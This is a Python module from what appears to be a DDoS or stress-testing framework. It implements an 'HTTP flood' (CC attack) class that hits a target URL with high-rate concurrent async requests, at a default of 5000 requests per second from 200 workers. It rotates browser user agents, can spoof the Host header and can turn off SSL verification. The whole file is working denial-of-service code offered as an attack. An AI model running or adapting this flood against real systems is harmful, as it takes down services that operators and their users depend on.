from __future__ import annotations

import asyncio
import aiohttp
import ssl
import random
import time
from typing import Optional
import structlog

from app.attacks.base import SafeAttackBase, AttackRegistry
from app.models import AttackCommand, AttackParams, AttackType, AttackStatus

logger = structlog.get_logger(__name__)


class HTTPFloodAttack(SafeAttackBase):
    """
    HTTP Flood (CC攻击) - 基于 aiohttp 高并发异步
    特性:
    - 连接池复用
    - 支持 HTTP/HTTPS
    - 自定义 Header/Body/Method
    - 请求级限流
    - 统计成功/失败/字节数
    """
    
    NAME = "http_flood"
    ATTACK_TYPE = AttackType.HTTP_FLOOD
    REQUIRES_ROOT = False
    DEFAULT_RPS = 5000
    DEFAULT_CONCURRENCY = 200
    
    # 用户代理池
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    ]
    
    def __init__(self, command: AttackCommand):
        super().__init__(command)
        self.session: Optional[aiohttp.ClientSession] = None
        self.connector: Optional[aiohttp.TCPConnector] = None
    
    async def _run(self):
        # 构造目标 URL
        target = self.params.target
        scheme = "https" if target.protocol == "tcp" and (target.port == 443 or self.params.use_https) else "http"
        url = f"{scheme}://{target.ip}:{target.port}{target.path}"
        
        # 准备请求头
        headers = dict(self.params.headers)
        if "User-Agent" not in headers:
            headers["User-Agent"] = random.choice(self.USER_AGENTS)
        if target.host_header:
            headers["Host"] = target.host_header
        
        # SSL 上下文
        ssl_context = None
        if scheme == "https":
            ssl_context = ssl.create_default_context()
            if not self.params.verify_ssl:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
        
        # 连接器 - 限制连接数
        self.connector = aiohttp.TCPConnector(
            limit=self.params.concurrency,
            limit_per_host=self.params.concurrency,
            ssl=ssl_context,
            enable_cleanup_closed=True,
            keepalive_timeout=30
        )
        
        # 超时设置
        timeout = aiohttp.ClientTimeout(
            total=self.params.duration,
            connect=5,
            sock_read=10,
            sock_connect=5
        )
        
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=timeout,
            headers=headers
        )
        
        # 启动工作协程
        workers = []
        for i in range(self.params.concurrency):
            worker = asyncio.create_task(self._worker(url, i))
            workers.append(worker)
            self._tasks.append(worker)
        
        # 等待所有工作完成或停止
        await asyncio.gather(*workers, return_exceptions=True)
    
    async def _worker(self, url: str, worker_id: int):
        """单个工作协程 - 持续发送请求直到停止"""
        method = self.params.method.upper()
        body = self.params.body
        
        while not self._check_stop():
            try:
                await self.rate_limiter.wait_for_token()
                
                if self._check_stop():
                    break
                
                start = time.monotonic()
                
                if method == "GET":
                    async with self.session.get(url) as resp:
                        await resp.read()
                        self._update_bytes(sent=len(resp.headers.get("Content-Length", "0")), received=resp.content_length or 0)
                elif method == "POST":
                    async with self.session.post(url, data=body) as resp:
                        await resp.read()
                        self._update_bytes(sent=len(body) if body else 0, received=resp.content_length or 0)
                elif method == "HEAD":
                    async with self.session.head(url) as resp:
                        pass
                
                self.result.total_requests += 1
                self.result.successful_requests += 1
                
                # 记录延迟
                latency = time.monotonic() - start
                self.result.metrics.setdefault("latencies", []).append(latency)
                
            except asyncio.CancelledError:
                break
            except aiohttp.ClientError as e:
                self.result.total_requests += 1
                self.result.failed_requests += 1
                self.result.errors.append(f"ClientError: {e}")
            except Exception as e:
                self.result.total_requests += 1
                self.result.failed_requests += 1
                self.result.errors.append(f"Error: {e}")
    
    async def _cleanup(self):
        await super()._cleanup()
        if self.session and not self.session.closed:
            await self.session.close()
        if self.connector and not self.connector.closed:
            await self.connector.close()


# 注册
AttackRegistry.register(AttackType.HTTP_FLOOD, HTTPFloodAttack)